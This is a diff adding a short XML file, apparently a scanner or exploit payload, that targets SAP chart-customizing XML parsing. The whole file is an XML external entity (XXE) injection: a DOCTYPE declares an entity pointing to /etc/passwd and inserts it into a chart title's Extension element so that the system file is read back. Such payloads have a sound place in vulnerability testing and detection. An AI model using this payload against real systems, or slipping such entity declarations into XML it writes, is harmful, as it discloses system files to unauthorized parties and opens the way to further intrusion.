@@ -1,0 +1,11 @@
+<?xml version='1.0' encoding='UTF-8'?>
+    <!DOCTYPE Extension [<!ENTITY xxe SYSTEM "/etc/passwd">]>
+    <SAPChartCustomizing version="1.1">
+      <Elements>
+        <ChartElements>
+          <Title>
+            <Extension>&xxe;</Extension>
+          </Title>
+        </ChartElements>
+      </Elements>
+    </SAPChartCustomizing>
